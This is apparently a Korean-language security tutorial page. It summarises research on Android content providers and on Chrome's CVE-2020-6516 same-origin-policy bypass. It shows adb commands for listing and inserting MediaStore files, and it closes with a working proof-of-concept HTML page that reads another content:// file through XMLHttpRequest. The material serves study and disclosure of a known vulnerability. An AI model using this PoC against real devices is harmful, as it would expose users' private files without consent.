{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**이것은 게시물의 요약입니다 [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### 미디어 스토어에서 파일 나열하기

미디어 스토어에서 관리되는 파일을 나열하려면 아래 명령어를 사용할 수 있습니다:
```bash
$ content query --uri content://media/external/file
```
각 인덱스 파일의 식별자와 경로만 표시하여 보다 인간 친화적인 출력을 위해:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
콘텐츠 제공자는 자신의 개인 네임스페이스에 격리되어 있습니다. 제공자에 대한 액세스는 특정 `content://` URI를 요구합니다. 제공자에 접근하기 위한 경로에 대한 정보는 애플리케이션 매니페스트 또는 Android 프레임워크의 소스 코드에서 얻을 수 있습니다.

### Chrome의 콘텐츠 제공자 접근

Android의 Chrome은 `content://` 스킴을 통해 콘텐츠 제공자에 접근할 수 있어, 타사 애플리케이션에서 내보낸 사진이나 문서와 같은 리소스에 접근할 수 있습니다. 이를 설명하기 위해, 파일을 미디어 스토어에 삽입한 다음 Chrome을 통해 접근할 수 있습니다:

미디어 스토어에 사용자 정의 항목 삽입:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
새로 삽입된 파일의 식별자를 발견하십시오:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
파일은 파일의 식별자로 구성된 URL을 사용하여 Chrome에서 볼 수 있습니다.

예를 들어, 특정 애플리케이션과 관련된 파일을 나열하려면:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Same-Origin-Policy Bypass

_동일 출처 정책_ (SOP)은 브라우저에서 서로 다른 출처의 리소스와 상호작용하는 것을 제한하는 보안 프로토콜로, Cross-Origin-Resource-Sharing (CORS) 정책에 의해 명시적으로 허용되지 않는 한 허용되지 않습니다. 이 정책은 정보 유출 및 교차 사이트 요청 위조를 방지하는 것을 목표로 합니다. Chrome은 `content://`를 로컬 스킴으로 간주하여, 각 로컬 스킴 URL이 별도의 출처로 취급되는 더 엄격한 SOP 규칙을 의미합니다.

그러나 CVE-2020-6516은 `content://` URL을 통해 로드된 리소스에 대한 SOP 규칙을 우회할 수 있는 Chrome의 취약점이었습니다. 결과적으로, `content://` URL의 JavaScript 코드는 다른 `content://` URL을 통해 로드된 리소스에 접근할 수 있었으며, 이는 특히 Android 10 이전 버전에서 구현되지 않은 범위 저장소를 사용하는 Android 기기에서 중요한 보안 문제였습니다.

아래의 개념 증명은 이 취약점을 보여주며, HTML 문서가 **/sdcard**에 업로드되고 미디어 저장소에 추가된 후, JavaScript에서 `XMLHttpRequest`를 사용하여 미디어 저장소의 다른 파일 내용을 접근하고 표시하여 SOP 규칙을 우회합니다.

Proof-of-Concept HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
